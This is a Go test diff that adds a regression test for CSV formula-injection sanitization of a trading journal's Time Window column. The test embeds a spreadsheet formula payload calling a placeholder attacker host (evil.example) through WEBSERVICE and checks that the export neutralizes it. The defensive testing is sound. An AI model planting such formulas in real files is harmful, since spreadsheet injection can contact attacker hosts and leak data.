@@ -79,3 +79,38 @@ func TestCSVExporter_ExportCSV_Sanitization(t *testing.T) {
 		t.Error("CSV contains raw formula - sanitization failed!")
 	}
 }
+
+// TestCSVExporter_ExportCSV_TimeWindowSanitized pins the fix for the formula
+// injection bypass: the Time Window column comes from user free text
+// (the #journal Session field) and must pass through sanitizeCSVField like
+// every other user-controlled column.
+func TestCSVExporter_ExportCSV_TimeWindowSanitized(t *testing.T) {
+	exporter := NewCSVExporter()
+
+	trades := []domain.Trade{
+		{
+			Date:       time.Date(2024, 1, 1, 0, 0, 0, 0, time.UTC),
+			AssetType:  domain.AssetCrypto,
+			Symbol:     "BTCUSD",
+			Direction:  domain.DirBuy,
+			Status:     domain.StatusWin,
+			ResultRR:   2,
+			TimeWindow: `=WEBSERVICE("http://evil.example")`,
+			Confluence: "FVG",
+			Notes:      "ok",
+		},
+	}
+
+	data, err := exporter.ExportCSV(context.Background(), trades)
+	if err != nil {
+		t.Fatalf("ExportCSV failed: %v", err)
+	}
+	csvContent := string(data)
+
+	if strings.Contains(csvContent, ",=WEBSERVICE") {
+		t.Error("CSV contains raw formula in Time Window column - sanitization failed!")
+	}
+	if !strings.Contains(csvContent, "'=WEBSERVICE") {
+		t.Error("Time Window formula was not prefixed with a single quote")
+	}
+}
